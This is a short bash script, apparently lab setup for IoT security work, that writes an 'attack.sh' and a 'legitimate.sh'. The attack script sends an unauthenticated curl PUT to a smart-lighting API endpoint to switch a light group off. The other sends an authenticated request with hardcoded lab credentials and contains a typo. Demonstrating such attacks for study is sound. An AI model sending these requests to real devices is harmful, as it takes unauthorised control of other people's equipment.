#!/bin/bash

touch attack.sh
echo "IP=\$1
curl --connect-timeout 5 -s -X PUT http://\$IP:8000/api/newdeveloper/groups/0/action -d {\\\"on\\\":false}" > attack.sh

touch legitimate.sh
echo "IP=$\1
curl -U tommy:iotsec --connect-timeout 5 -s -X PUT http://\$IP:8000/api/newdeveloper/groups/0/action -d {\\\"on\\\":true}" > legitimate.sh

chmod +x attack.sh legitimate.sh

